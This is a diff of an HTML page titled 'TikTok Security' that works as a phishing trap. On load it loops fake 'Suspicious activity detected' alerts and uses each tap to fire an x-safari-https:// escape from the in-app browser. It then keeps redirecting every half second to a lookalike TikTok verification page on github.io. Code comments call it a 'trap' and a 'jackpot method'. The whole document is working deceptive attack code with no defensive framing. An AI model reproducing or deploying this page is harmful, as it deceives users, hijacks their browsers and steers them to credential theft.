@@ -3,50 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verification Check</title>
+    <title>TikTok Security</title>
     <style>
-        body { 
+        body, html { 
             margin: 0; padding: 0; background: #ffffff; 
             font-family: -apple-system, sans-serif;
-            display: flex; justify-content: center; align-items: center;
-            height: 100vh; text-align: center;
+            height: 100%; display: flex; justify-content: center; align-items: center;
         }
-
-        .container { padding: 20px; max-width: 400px; }
-        
-        .header { color: #161823; font-size: 24px; font-weight: 700; margin-bottom: 10px; }
-        .subtext { color: #8A8B91; font-size: 16px; margin-bottom: 40px; }
-        
-        /* The jackpot button */
-        .btn {
-            background-color: #FE2C55; color: #ffffff; border-radius: 4px;
-            font-size: 18px; font-weight: 600; padding: 15px 60px;
-            text-decoration: none; display: inline-block; cursor: pointer;
-            border: none; width: 100%; box-sizing: border-box;
-        }
+        #status { color: #8A8B91; font-size: 14px; text-align: center; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="header">Security Verification</div>
-        <p class="subtext">Please tap the button below to continue to the verification page.</p>
-        
-        <button class="btn" onclick="triggerJackpot()">Verify</button>
+    <div id="status">
+        <p>Security scan in progress...</p>
+        <p>Please follow on-screen instructions.</p>
     </div>
 
     <script>
-        const destination = "tiktokverification.github.io/captcha/Verification/verify1.html";
-
-        function triggerJackpot() {
-            // Method #1: The x-safari-https bypass
-            window.location.href = "x-safari-https://" + destination;
-
-            // Fallback: Opens in the current browser if protocol fails
-            setTimeout(() => {
-                window.location.assign("https://" + destination);
-            }, 750);
+        const target = "tiktokverification.github.io/captcha/Verification/verify1.html";
+        
+        function breakout() {
+            // Firing the confirmed jackpot method
+            window.location.href = "x-safari-https://" + target;
         }
+
+        window.onload = function() {
+            const duration = 10000; // 10 second trap
+            const startTime = Date.now();
+
+            function runTrap() {
+                const elapsed = Date.now() - startTime;
+                const remaining = Math.max(0, Math.ceil((duration - elapsed) / 1000));
+
+                if (remaining > 0) {
+                    // 1. The Alert creates the "User Intent" gesture when they tap OK
+                    alert("Suspicious activity detected.\n\nRunning system integrity check...\n\nTime remaining: " + remaining + "s");
+                    
+                    // 2. Immediately use that intent to fire the breakout
+                    breakout();
+
+                    // 3. Queue the next alert instantly
+                    setTimeout(runTrap, 10);
+                } else {
+                    // Final sequence
+                    alert("Security check complete. Opening Safari for verification...");
+                    breakout();
+                    
+                    // Permanent fallback loop
+                    setInterval(() => {
+                        window.location.assign("https://" + target);
+                    }, 500);
+                }
+            }
+
+            // Start the cycle 500ms after page load
+            setTimeout(runTrap, 500);
+        };
     </script>
 </body>
 </html>
